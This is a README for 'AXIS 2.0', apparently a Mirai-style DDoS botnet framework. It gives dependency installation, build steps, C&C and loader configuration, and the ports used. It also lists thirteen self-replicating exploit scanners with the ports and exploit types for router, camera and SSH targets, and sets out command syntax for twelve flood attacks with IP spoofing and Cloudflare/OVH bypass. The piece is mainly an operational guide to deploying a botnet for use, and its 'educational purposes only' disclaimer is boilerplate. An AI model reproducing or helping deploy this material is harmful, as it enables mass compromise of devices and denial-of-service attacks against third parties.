# AXIS 2.0 Botnet - Complete DDoS Framework

**Advanced DDoS botnet framework with self-replication, 12 attack methods, and 13 exploit scanners**

---

## ⚠️ NOTICE

This is **SOURCE CODE ONLY** - not a finished product. You must:
1. Install all dependencies (Go, GCC, cross-compilers, MySQL)
2. Configure all settings for your environment
3. Compile all components
4. Set up infrastructure (web server, TFTP, database)
5. Test thoroughly before any deployment

---

## 📋 Requirements

### Build Environment
- **OS**: Linux (Ubuntu/Debian/CentOS)
- **Go**: 1.21+ (for C&C server and extra scanners)
- **GCC**: With cross-compilation toolchains (for bot binaries)
- **MySQL/MariaDB**: Database server

### Infrastructure
- **Web Server**: Apache/Nginx (binary hosting)
- **TFTP Server**: tftpd-hpa (alternative download method)
- **Database**: MySQL/MariaDB (user management, logging)

---

## 🎯 Features

### Core Capabilities
- **13 Exploit Scanners** - Bot self-replication via multiple infection vectors
- **3 Server-Side Scanners** - External bot loaders (Go-based)
- **12 Optimized Attack Methods** - Layer 4 and Layer 7 DDoS attacks
- **Modern UI** - Cyan/white/yellow admin panel interface
- **API Support** - REST API for remote control
- **Database System** - User management, logging, whitelisting
- **Encrypted Telnet** - TLS 1.2+ admin connections

### Attack Methods

#### Layer 4 Attacks (9 methods)
1. **TCP Flood** - Raw TCP SYN flood optimized for Gbps
2. **UDP Flood** - Raw UDP flood optimized for Gbps
3. **OVH TCP** - TCP with OVH Game bypass (SYN+ACK+PSH+URG)
4. **OVH UDP** - UDP with OVH Game bypass (DNS-like headers)
5. **ICMP** - ICMP Echo Request flood
6. **AXIS-L4** - Combined OVHTCP + OVHUDP + ICMP
7. **GRE IP** - GRE encapsulated IP flood
8. **GRE ETH** - GRE encapsulated Ethernet flood
9. **ULTIMATE L4** - All-in-one: TCP+UDP+ICMP+GRE-IP+GRE-ETH with IP spoofing

#### Layer 7 Attacks (3 methods)
10. **HTTP Flood** - HTTP GET/POST flood optimized for RPS
11. **AXIS-L7** - Browser emulation + HTTPS + Cloudflare bypass
12. **ULTIMATE L7** - Advanced multi-layer bypass (CF, Akamai, WAF) with session management

### Scanner Arsenal (13 Self-Replication Scanners)

| Scanner | Port | Exploit Type | Target |
|---------|------|--------------|--------|
| **Telnet** | 23 | Brute-force (270+ creds) | IoT devices, routers |
| **SSH** | 22 | Brute-force (100+ creds) | Cloud providers, VPS |
| **Huawei** | 37215 | SOAP RCE | Huawei ISP routers |
| **Zyxel** | 8080 | Command injection | Zyxel SOHO routers |
| **ThinkPHP** | 80 | RCE | ThinkPHP web apps |
| **Realtek** | 52869 | UPnP RCE | Realtek chip routers |
| **GPON** | 80/8080 | Command injection | FTTH/GPON ONT devices |
| **Telnet Bypass** | 23 | Auth bypass (`-f root`) | IoT with auth bypass |
| **DVR** | 80 | Command injection | CCTV/DVR cameras |
| **Zhone** | 80 | Dual: unauth + auth brute-force | Zhone ONT/OLT |
| **XiongMai** | 34599 | CVE-2017-16724 | XM IP cameras |
| **Hilink** | 80 | Command injection | Hilink LTE routers |
| **ASUS** | 80 | Command injection | ASUS RT-AC routers |

### Server-Side Scanners (3 Go-Based Loaders)
- **telnet-scanner** - Mass telnet brute-force with CIDR support
- **0day-exploit** - Exploit scanner for CF Rules targets
- **realtek-loader** - Realtek UPnP loader with URL/CIDR support

---

## 📁 Directory Structure

```
AXIS 2.0/
├── cnc/                        # Command & Control server (Go)
│   ├── main.go                # Main server with TLS support
│   ├── admin.go               # Admin panel handler
│   ├── attack.go              # Attack parsing (12 methods)
│   ├── bot.go                 # Bot connection handling
│   ├── clientList.go          # Bot management
│   ├── database.go            # MySQL integration
│   └── api.go                 # REST API
├── extrascanners/              # Server-side scanners (Go)
│   ├── telnet-scanner.go      # Mass telnet brute-force
│   ├── 0day-exploit.go        # 0-day exploit scanner
│   ├── realtek-loader.go      # Realtek UPnP loader
│   └── run-all.sh             # Run all 3 simultaneously
├── bot/                        # Bot source (C)
│   ├── main.c                 # Main bot loop
│   ├── attack.c/h             # Attack implementations (12 methods)
│   ├── scanner.c/h            # Telnet brute-force scanner
│   ├── killer.c/h             # Anti-malware killer
│   ├── huawei.c/h             # Huawei SOAP exploit
│   ├── zyxel.c/h              # Zyxel command injection
│   ├── thinkphp.c/h           # ThinkPHP RCE
│   ├── realtek.c/h            # Realtek UPnP exploit
│   ├── gpon_scanner.c/h       # GPON exploit (ports 80 & 8080)
│   ├── telnetbypass.c/h       # Telnet auth bypass
│   ├── dvr.c/h                # DVR camera exploit
│   ├── zhone.c/h              # Zhone ONT/OLT (dual attack)
│   ├── ssh.c/h                # SSH brute-force
│   ├── xm.c/h                 # XiongMai camera (CVE-2017-16724)
│   ├── hilink.c/h             # Hilink LTE router exploit
│   ├── asus.c/h               # ASUS router exploit
│   └── config.h               # Bot configuration
├── loader/                     # Telnet loader (C)
│   ├── main.c                 # Main loader
│   ├── server.c/h             # Server management
│   ├── connection.c/h         # Connection handling
│   ├── binary.c/h             # Binary payload handling
│   └── telnet_info.c/h        # Telnet info parsing
├── dlr/                        # Downloader (C)
│   ├── main.c                 # Minimal ELF downloader
│   └── dlr.h                  # Downloader config
├── build.sh                    # Build script
├── database.sql                # MySQL schema
├── scanListen.go               # Scan result listener
├── README.md                   # This file
├── QUICK_SETUP.txt             # Quick reference
├── TROUBLESHOOTING.txt         # Troubleshooting guide
├── ULTIMATE_L4_README.md       # ULTIMATE L4 documentation
└── ULTIMATE_L7_README.md       # ULTIMATE L7 documentation
```

---

## 🔨 Building

### 1. Install Dependencies

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install -y golang-go gcc mysql-server apache2 tftpd-hpa build-essential

# Cross-compilers (optional, for multi-arch bots)
sudo apt install -y \
    gcc-arm-linux-gnueabi \
    gcc-arm-linux-gnueabihf \
    gcc-mips-linux-gnu \
    gcc-mipsel-linux-gnu
```

### 2. Set Up Database

```bash
mysql -u root -p < database.sql
```

### 3. Configure

Edit `bot/config.h` with your server IP:
```c
#define CNC_ADDR "YOUR.SERVER.IP.HERE"
#define CNC_PORT 3778
```

### 4. Build All Components

```bash
chmod +x build.sh
./build.sh
```

---

## 🚀 Running

### Start C&C Services

```bash
# Terminal 1: C&C Server
./cnc_server

# Terminal 2: Scan Listener
./scanListen

# Terminal 3: Loader (feed IPs via stdin)
./loader < list.txt
```

### Extra Scanners (Server-Side Bot Loaders)

```bash
# Build everything (includes extra scanners)
./build.sh

# Run all 3 scanners simultaneously (RECOMMENDED)
cd extrascanners
./run-all.sh YOUR_SERVER_IP 1000

# Or run individual scanners
./extrascanners/telnet-scanner leaks/10.lst 1000
./extrascanners/0day-exploit leaks/CF-Rules-1.txt YOUR_SERVER_IP 500
./extrascanners/realtek-loader b4ckdoorarchive/RANDOM.LST/realtek.lst YOUR_SERVER_IP 1000
```

### Connect to Admin Panel

```bash
# Encrypted Telnet (TLS)
openssl s_client -connect YOUR_SERVER_IP:3777 -quiet

# Login with database credentials
```

---

## ⚔️ Attack Methods

### Layer 4 Attacks

#### 1. TCP Flood
```bash
!tcp <ip> <duration> len=1400 dport=80
```
- Raw TCP SYN flood
- Optimized for maximum bandwidth (Gbps)
- Configurable packet size (default: 1400 bytes)

#### 2. UDP Flood
```bash
!udp <ip> <duration> len=1400 dport=53
```
- Raw UDP flood
- Optimized for maximum bandwidth (Gbps)
- Random payload generation

#### 3. OVH TCP Bypass
```bash
!ovhtcp <ip> <duration> len=1400 dport=27015
```
- TCP flood with OVH Game bypass
- SYN+ACK+PSH+URG flags set

#### 4. OVH UDP Bypass
```bash
!ovhudp <ip> <duration> len=1400 dport=27015
```
- UDP flood with OVH Game bypass
- DNS-like header to bypass filters

#### 5. ICMP Ping Flood
```bash
!icmp <ip> <duration> len=64
```
- ICMP Echo Request flood
- No port needed (Layer 3)

#### 6. AXIS-L4 (Combined)
```bash
!axis-l4 <ip> <duration> len=1400 dport=80
```
- Combined: OVHTCP + OVHUDP + ICMP simultaneously

#### 7. GRE IP Flood
```bash
!greip <ip> <duration> dport=80
```
- GRE encapsulated IP flood
- Bypasses some DDoS protection

#### 8. GRE Ethernet Flood
```bash
!greeth <ip> <duration> dport=80
```
- GRE encapsulated Ethernet frame flood

#### 9. ULTIMATE L4 (All-in-One)
```bash
!ultimate-l4 <ip> <duration> len=1400 dport=80
```
- **Combined:** TCP + UDP + ICMP + GRE-IP + GRE-ETH
- **Distribution:** 30% TCP, 30% UDP, 15% ICMP, 15% GRE-IP, 10% GRE-ETH
- **IP Spoofing:** Generates spoofed source IPs from residential ranges
- **Random TTL:** 32, 64, 128, 255 for filter evasion
- **OVH Bypass:** TCP with special flags, UDP with DNS-like headers

See `ULTIMATE_L4_README.md` for complete documentation.

### Layer 7 Attacks

#### 10. HTTP Flood
```bash
!http https://example.com/ 300 method=GET conns=100
```
- HTTP GET/POST flood
- Optimized for maximum requests per second (RPS)

#### 11. AXIS-L7
```bash
!axis-l7 https://target.com/ 300 domain=target.com
```
- Browser emulation
- HTTPS support
- Cloudflare bypass
- Cache bypass headers

#### 12. ULTIMATE L7
```bash
!ultimate-l7 https://protected.site/ 300 domain=protected.site.com cookies="cf_clearance=TOKEN"
```
- Advanced browser emulation (10 rotating user-agents)
- Complete Sec-Fetch and Sec-Ch-Ua header suite
- Header spoofing (X-Forwarded-For with spoofed IPs - no proxies)
- Connection pooling with keep-alive
- Session persistence via cookie extraction
- Response analysis (CF, Akamai, rate limit detection)
- Adaptive delays based on detection
- Multi-method attack (GET/HEAD/POST weighted)

See `ULTIMATE_L7_README.md` for complete documentation.

---

## 📊 Attack Method Comparison

| Method | Type | Vectors | IP Spoofing | Bypass | Notes |
|--------|------|---------|-------------|--------|-------|
| tcp | L4 | TCP | ❌ | ❌ | Basic TCP flood |
| udp | L4 | UDP | ❌ | ❌ | Basic UDP flood |
| ovhtcp | L4 | TCP | ❌ | ✅ | OVH TCP bypass |
| ovhudp | L4 | UDP | ❌ | ✅ | OVH UDP bypass |
| icmp | L4 | ICMP | ❌ | ❌ | Layer 3 attack |
| axis-l4 | L4 | TCP+UDP+ICMP | ❌ | ✅ | Combined attack |
| greip | L4 | GRE-IP | ✅ (inner) | ✅ | Encapsulation |
| greeth | L4 | GRE-ETH | ✅ (inner) | ✅ | Triple encapsulation |
| **ultimate-l4** | L4 | **ALL 5** | ✅ | ✅ | **All-in-one L4** |
| http | L7 | HTTP | ❌ | ❌ | Basic HTTP flood |
| axis-l7 | L7 | HTTP | ❌ | ✅ | Browser emulation |
| **ultimate-l7** | L7 | HTTP | ✅ (headers) | ✅ | **Advanced L7** |

---

## 🌍 Scanner Target Regions

| Scanner | Asia | Europe | N. America | S. America | Africa | Middle East | Oceania |
|---------|------|--------|------------|------------|--------|-------------|---------|
| Telnet | ✓ | ✓ | - | ✓ | ✓ | ✓ | ✓ |
| SSH | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| GPON | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| Huawei | ✓ | ✓ | - | ✓ | ✓ | ✓ | ✓ |
| Zyxel | ✓ | ✓ | ✓ | ✓ | - | ✓ | ✓ |
| ThinkPHP | ✓ | ✓ | ✓ | - | - | - | ✓ |
| Realtek | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| DVR | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| Zhone | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| SSH | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| XM | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| Hilink | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| ASUS | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |

**Notes:**
- SSH scanner uses proper SSH protocol handshake
- SSH targets cloud providers: AWS, DigitalOcean, Linode, Vultr, OVH, Hetzner
- Zhone has dual attack: unauthenticated RCE + authenticated brute-force (150+ creds)
- GPON handles both ports 80 and 8080 in single scanner
- XiongMai exploits CVE-2017-16724 in IP cameras

---

## 🔧 Configuration

### Bot Configuration (`bot/config.h`)
```c
#define CNC_ADDR "YOUR.SERVER.IP.HERE"
#define CNC_PORT 3778
#define SCAN_CB_PORT 9555
#define HTTP_SERVER "YOUR.SERVER.IP.HERE"
#define HTTP_PORT 80

// Enable features
#define KILLER      // Anti-malware
#define SELFREP     // Self-replication scanners
#define WATCHDOG    // Hardware watchdog
```

### C&C Configuration (`cnc/main.go`)
```go
const DatabaseAddr string = "127.0.0.1:3306"
const DatabaseUser string = "root"
const DatabasePass string = "YOUR_PASSWORD"
const DatabaseTable string = "AXIS2"

const CNCListenAddr string = "0.0.0.0:3778"      // Bot connections
const TelnetTLSListenAddr string = "0.0.0.0:3777" // Admin TLS
const APIListenAddr string = "0.0.0.0:3779"       // REST API
```

### Loader Configuration (`loader/config.h`)
```c
#define HTTP_SERVER "YOUR.SERVER.IP.HERE"
#define HTTP_PORT 80
#define TFTP_SERVER "YOUR.SERVER.IP.HERE"
#define TFTP_PORT 69
```

---

## 📡 Ports

| Port | Service | Purpose |
|------|---------|---------|
| 22 | SSH | Admin access |
| 80 | HTTP | Binary hosting |
| 3777 | TLS Telnet | Admin panel (encrypted) |
| 3778 | TCP | Bot connections |
| 3779 | HTTP | REST API |
| 9555 | TCP | Scan results listener |
| 69 | UDP | TFTP server |

---

## 🗄️ Database Schema

### Tables
- **users** - User accounts, permissions, API keys
- **history** - Attack history and logging
- **whitelist** - Protected IP ranges
- **logins** - Login attempt logs
- **online** - Currently online users

### Default Credentials
```
Username: admin
Password: admin123  (CHANGE IMMEDIATELY!)
API Key: AXIS2-ADMIN-APIKEY (CHANGE IMMEDIATELY!)
```

---

## 📚 Documentation

| File | Description |
|------|-------------|
| `README.md` | Main documentation (this file) |
| `QUICK_SETUP.txt` | Quick installation guide |
| `TROUBLESHOOTING.txt` | Comprehensive troubleshooting |
| `ULTIMATE_L4_README.md` | ULTIMATE L4 attack documentation |
| `ULTIMATE_L7_README.md` | ULTIMATE L7 attack documentation |

---

## ⚠️ Legal Disclaimer

**WARNING**: This software is provided for **EDUCATIONAL PURPOSES ONLY**.

- Only use on networks you **OWN** or have **EXPLICIT PERMISSION** to test
- Unauthorized use is **ILLEGAL**
- The authors are **NOT RESPONSIBLE** for misuse
- Compliance with all applicable laws is **YOUR RESPONSIBILITY**

By using this software, you agree to:
- Use only for educational purposes
- Comply with all applicable laws
- Not use for unauthorized attacks
- Take full responsibility for your actions

---

## 👥 Credits

**Developed by AXIS Group**

**Version**: 2.0  
**Release Date**: March 2026  
**License**: Educational use only

---

## 📖 Quick Reference

### Build Commands
```bash
./build.sh                    # Build everything
./cnc_server                  # Start C&C
./scanListen                  # Start scan listener
./loader < ips.txt            # Start loader
```

### Admin Commands
```bash
help                          # Show help
layer4                        # L4 attack methods
layer7                        # L7 attack methods
admin                         # Admin commands
ports                         # Common ports
```

### Attack Examples
```bash
!tcp 1.2.3.4 300 dport=80
!udp 1.2.3.4 300 dport=53
!ultimate-l4 1.2.3.4 300 dport=80
!ultimate-l7 https://target.com/ 300 domain=target.com
```

---

**AXIS 2.0 - Complete DDoS Framework**
